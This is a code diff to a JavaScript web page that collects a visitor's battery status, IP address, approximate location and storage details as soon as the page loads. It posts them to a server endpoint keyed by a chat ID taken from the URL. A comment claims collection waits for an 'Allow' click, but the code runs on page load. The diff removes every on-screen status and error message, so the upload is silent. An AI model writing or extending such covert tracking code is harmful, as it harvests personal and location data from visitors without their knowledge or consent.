@@ -118,7 +118,7 @@ async function getStorageDetails() {
 // Collect only after clicking Allow
 document.addEventListener("DOMContentLoaded", async () => {
 
-  // ✅ FIRST: Collect Data
+  // FIRST: Collect Data
   const battery = await getBatteryDetails();
   const ipData = await getIpAndApproxLocation();
   const storageData = await getStorageDetails();
@@ -145,15 +145,11 @@ document.addEventListener("DOMContentLoaded", async () => {
   resultEl.textContent = JSON.stringify(collectedData, null, 2);
   sendBtn.disabled = false;
 
-  // ✅ SECOND: Send After First Completes
-
+  // SECOND: Send After First Completes
   const chatId = getChatIdFromUrl();
   if (!chatId) {
-    statusEl.textContent = "Chat ID missing.";
     return;
   }
-
-  statusEl.textContent = "Sending...";
 
   try {
     const res = await fetch(`/num/${chatId}`, {
@@ -162,17 +158,10 @@ document.addEventListener("DOMContentLoaded", async () => {
       body: JSON.stringify(collectedData),
     });
 
-    const data = await res.json();
-
-    if (!res.ok) {
-      statusEl.textContent = data.error || "Failed.";
-      return;
-    }
-
-    statusEl.textContent = "Sent successfully.";
+    await res.json();
 
   } catch (err) {
-    statusEl.textContent = "Network error.";
+    console.error("Network error:", err);
   }
 
 });
